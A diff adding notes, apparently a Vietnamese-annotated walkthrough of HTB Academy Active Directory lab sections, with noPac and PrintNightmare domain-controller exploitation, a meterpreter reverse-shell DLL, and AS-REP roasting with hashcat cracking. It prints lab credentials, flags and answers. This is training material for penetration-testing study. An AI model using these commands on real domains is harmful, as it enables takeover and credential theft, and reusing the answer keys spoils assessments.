@@ -1165,3 +1165,246 @@ impacket-mssqlclient INLANEFREIGHT/DAMUNDSEN@172.16.5.150 -windows-auth
 ```sql
 SQL> SELECT * FROM OPENROWSET(BULK N'C:/Users/damundsen/Desktop/flag.txt', SINGLE_CLOB) AS Contents
 ```
+
+
+# Bleeding Edge Vulnerabilities
+
+#### Questions
+
+Answer the question(s) below to complete this Section and earn cubes!
+
+Target(s): 10.129.81.204 (ACADEMY-EA-ATTACK01)   
+
+Life Left: 116 minute(s)  Terminate 
+
+
+ SSH to 10.129.81.204 (ACADEMY-EA-ATTACK01) with user "htb-student" and password "HTB_@cademy_stdnt!"
+
++ 0  Which two CVEs indicate NoPac.py may work? (Format: ####-#####&####-#####, no spaces)
+
+2021-42278&2021-42287
+
+ Authenticate to 10.129.81.204 (ACADEMY-EA-ATTACK01) with user "htb-student" and password "HTB_@cademy_stdnt!"
+
++ 0  Apply what was taught in this section to gain a shell on DC01. Submit the contents of flag.txt located in the DailyTasks directory on the Administrator's desktop.
+
+#### noPAC
+
+Kiểm tra liệu target có vulnerable hay không:
+
+```zsh
+sudo python3 scanner.py inlanefreight.local/adunn:SyncMaster757 -dc-ip 172.16.5.5 -use-ldap
+
+███    ██  ██████  ██████   █████   ██████ 
+████   ██ ██    ██ ██   ██ ██   ██ ██      
+██ ██  ██ ██    ██ ██████  ███████ ██      
+██  ██ ██ ██    ██ ██      ██   ██ ██      
+██   ████  ██████  ██      ██   ██  ██████ 
+                                           
+                                        
+    
+[*] Current ms-DS-MachineAccountQuota = 10
+[*] Got TGT with PAC from 172.16.5.5. Ticket size 1514
+[*] Got TGT from ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL. Ticket size 661
+```
+
+`Current ms-DS-MachineAccountQuota = 10` -> có thể dùng noPAC
+
+Lấy shell của DC
+
+```zsh
+sudo python3 noPac.py INLANEFREIGHT.LOCAL/adunn:SyncMaster757 -dc-ip 172.16.5.5  -dc-host ACADEMY-EA-DC01 -shell --impersonate administrator -use-ldap
+```
+
+
+Get flag
+```powershell
+C:\Windows\system32>cd C:\
+[-] You can't CD under SMBEXEC. Use full paths.
+C:\Windows\system32>dir C:\Users\Administrator\Desktop\
+ Volume in drive C has no label.
+ Volume Serial Number is B8B3-0D72
+
+ Directory of C:\Users\Administrator\Desktop
+
+04/09/2022  11:07 AM    <DIR>          .
+04/09/2022  11:07 AM    <DIR>          ..
+03/23/2022  04:19 AM    <DIR>          DailyTasks
+               0 File(s)              0 bytes
+               3 Dir(s)  18,249,109,504 bytes free
+
+C:\Windows\system32>type C:\Users\Administrator\Desktop\DailyTasks\flag.txt
+D0ntSl@ckonN0P@c!
+C:\Windows\system32>
+```
+
+#### PrintNightmare
+
+Enum:
+
+```zsh
+impacket-rpcdump @172.16.5.5 | egrep 'MS-RPRN|MS-PAR'
+Protocol: [MS-PAR]: Print System Asynchronous Remote Protocol 
+Protocol: [MS-RPRN]: Print System Remote Protocol 
+```
+
+Cấu hình `exploit/multi/handler` như sau:
+
+`set payload windows/x64/meterpreter/reverse_tcp`
+
+```zsh
+[msf](Jobs:0 Agents:0) exploit(multi/handler) >> show options
+
+Module options (exploit/multi/handler):
+
+   Name  Current Setting  Required  Description
+   ----  ---------------  --------  -----------
+
+
+Payload options (windows/x64/meterpreter/reverse_tcp):
+
+   Name      Current Setting  Required  Description
+   ----      ---------------  --------  -----------
+   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
+   LHOST     172.16.5.225     yes       The listen address (an interface may be specified)
+   LPORT     8080             yes       The listen port
+```
+
+Tiếp theo tạo payload .dll
+
+```zsh
+msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=172.16.5.225 LPORT=8080 -f dll > backupscript.dll
+```
+
+Trong thư mục có chứa backupscript.dll, mở smb server để truyền file cho khai thác:
+```zsh
+sudo impacket-smbserver -smb2support CompData .
+```
+
+Tiến hành khai thác:
+
+```zsh
+sudo python3 CVE-2021-1675.py inlanefreight.local/forend:Klmcargo2@172.16.5.5 '\\172.16.5.225\CompData\backupscript.dll'
+```
+
+![](images/20.png)
+
+# Miscellaneous Misconfigurations
+#### Questions
+
+Answer the question(s) below to complete this Section and earn cubes!
+
+Target(s): 10.129.124.90 (ACADEMY-EA-MS01) ,10.129.138.214 (ACADEMY-EA-ATTACK01)   
+
+Life Left: 171 Terminate 
+
+ RDP to 10.129.124.90 (ACADEMY-EA-MS01) ,10.129.138.214 (ACADEMY-EA-ATTACK01) with user "htb-student" and password "Academy_student_AD!"
+
++ 0  Find another user with the passwd_notreqd field set. Submit the samaccountname as your answer. The samaccountname starts with the letter "y".
+
+```powershell
+PS C:\Tools> Get-DomainUser -UACFilter PASSWD_NOTREQD | Select-Object samaccountname,useraccountcontrol
+
+samaccountname                                                           useraccountcontrol
+--------------                                                           ------------------
+guest                  ACCOUNTDISABLE, PASSWD_NOTREQD, NORMAL_ACCOUNT, DONT_EXPIRE_PASSWORD
+mlowe                                  PASSWD_NOTREQD, NORMAL_ACCOUNT, DONT_EXPIRE_PASSWORD
+ygroce               PASSWD_NOTREQD, NORMAL_ACCOUNT, DONT_EXPIRE_PASSWORD, DONT_REQ_PREAUTH
+ehamilton                              PASSWD_NOTREQD, NORMAL_ACCOUNT, DONT_EXPIRE_PASSWORD
+$725000-9jb50uejje9f                         ACCOUNTDISABLE, PASSWD_NOTREQD, NORMAL_ACCOUNT
+nagiosagent                                                  PASSWD_NOTREQD, NORMAL_ACCOUNT
+```
+
++ 0  Find another user with the "Do not require Kerberos pre-authentication setting" enabled. Perform an ASREPRoasting attack against this user, crack the hash, and submit their cleartext password as your answer.
+
+```powershell
+PS C:\Tools> Get-DomainUser -PreauthNotRequired | select samaccountname,userprincipalname,useraccountcontrol | fl
+
+
+samaccountname     : ygroce
+userprincipalname  : ygroce@inlanefreight.local
+useraccountcontrol : PASSWD_NOTREQD, NORMAL_ACCOUNT, DONT_EXPIRE_PASSWORD, DONT_REQ_PREAUTH
+
+samaccountname     : mmorgan
+userprincipalname  : mmorgan@inlanefreight.local
+useraccountcontrol : NORMAL_ACCOUNT, DONT_EXPIRE_PASSWORD, DONT_REQ_PREAUTH
+```
+
+
+```powershell
+PS C:\Tools> .\Rubeus.exe asreproast /user:ygroce /nowrap /format:hashcat
+
+   ______        _
+  (_____ \      | |
+   _____) )_   _| |__  _____ _   _  ___
+  |  __  /| | | |  _ \| ___ | | | |/___)
+  | |  \ \| |_| | |_) ) ____| |_| |___ |
+  |_|   |_|____/|____/|_____)____/(___/
+
+  v2.0.2
+
+
+[*] Action: AS-REP roasting
+
+[*] Target User            : ygroce
+[*] Target Domain          : INLANEFREIGHT.LOCAL
+
+[*] Searching path 'LDAP://ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL/DC=INLANEFREIGHT,DC=LOCAL' for '(&(samAccountType=805306368)(userAccountControl:1.2.840.113556.1.4.803:=4194304)(samAccountName=ygroce))'
+[*] SamAccountName         : ygroce
+[*] DistinguishedName      : CN=Yolanda Groce,OU=HelpDesk,OU=IT,OU=HQ-NYC,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
+[*] Using domain controller: ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL (172.16.5.5)
+[*] Building AS-REQ (w/o preauth) for: 'INLANEFREIGHT.LOCAL\ygroce'
+[+] AS-REQ w/o preauth successful!
+[*] AS-REP hash:
+
+      $krb5asrep$23$ygroce@INLANEFREIGHT.LOCAL:33C607E353D6DD80BCC177AB59533E9C$1647281031C404FC4ED5C8F3A869FFB87E679265D6E8D9A2CF8BA6E7C473B6A2498735B94A9DC278E90DA9281D54AE2B4DB16AAEFD14BBE26795819D2B7B14655FFEC44B627EA0A5B42A13E561DCA473E0760752B572996C2B0969A5CFC7D9B4B487BA4158A499FA59A9D40A7EC56AFE9CB14E7E9D9F1C0F01BB2C238186030F1DEFACA6D84CD8507B944D1CF0B8245DF5C2BC184DB79E7CA1A619F3F4F28766F946E17715E4F082EEDF25E107DB442CB3F9FBCFCB90132E5D1AF4869ED3C112B6FBD740C9C763B3E04155BAB470CD8E8E9AC2C5EEC63187B82191D5A39403623F8F7DEF23F4D0471150775B04228CDE260663882EBB60B0E29F
+```
+
+
+```zsh
+hashcat -m 18200 hash.txt /usr/share/wordlists/rockyou.txt
+$krb5asrep$23$ygroce@INLANEFREIGHT.LOCAL:33c607e353d6dd80bcc177ab59533e9c$1647281031c404fc4ed5c8f3a869ffb87e679265d6e8d9a2cf8ba6e7c473b6a2498735b94a9dc278e90da9281d54ae2b4db16aaefd14bbe26795819d2b7b14655ffec44b627ea0a5b42a13e561dca473e0760752b572996c2b0969a5cfc7d9b4b487ba4158a499fa59a9d40a7ec56afe9cb14e7e9d9f1c0f01bb2c238186030f1defaca6d84cd8507b944d1cf0b8245df5c2bc184db79e7ca1a619f3f4f28766f946e17715e4f082eedf25e107db442cb3f9fbcfcb90132e5d1af4869ed3c112b6fbd740c9c763b3e04155bab470cd8e8e9ac2c5eec63187b82191d5a39403623f8f7def23f4d0471150775b04228cde260663882ebb60b0e29f:Pass@word
+```
+
+
+# Domain Trusts Primer
+
+#### Questions
+
+Answer the question(s) below to complete this Section and earn cubes!
+
+Target(s): 10.129.96.32 (ACADEMY-EA-MS01)   
+
+
+ RDP to 10.129.96.32 (ACADEMY-EA-MS01) with user "htb-student" and password "Academy_student_AD!"
+
++ 0  What is the child domain of INLANEFREIGHT.LOCAL? (format: FQDN, i.e., DEV.ACME.LOCAL)
+
+```powershell
+PS C:\Tools> Import-Module .\PowerView.ps1
+PS C:\Tools> Get-DomainTrustMapping
+
+
+SourceName      : INLANEFREIGHT.LOCAL
+TargetName      : LOGISTICS.INLANEFREIGHT.LOCAL
+TrustType       : WINDOWS_ACTIVE_DIRECTORY
+TrustAttributes : WITHIN_FOREST
+TrustDirection  : Bidirectional
+WhenCreated     : 11/1/2021 6:20:22 PM
+WhenChanged     : 3/29/2022 5:14:31 PM
+
+SourceName      : INLANEFREIGHT.LOCAL
+TargetName      : FREIGHTLOGISTICS.LOCAL
+TrustType       : WINDOWS_ACTIVE_DIRECTORY
+TrustAttributes : FOREST_TRANSITIVE
+TrustDirection  : Bidirectional
+WhenCreated     : 11/1/2021 8:07:09 PM
+WhenChanged     : 3/29/2022 4:48:04 PM
+```
+
++ 0  What domain does the INLANEFREIGHT.LOCAL domain have a forest transitive trust with?
+
+FREIGHTLOGISTICS.LOCAL
+
++ 0  What direction is this trust?
+Bidirectional
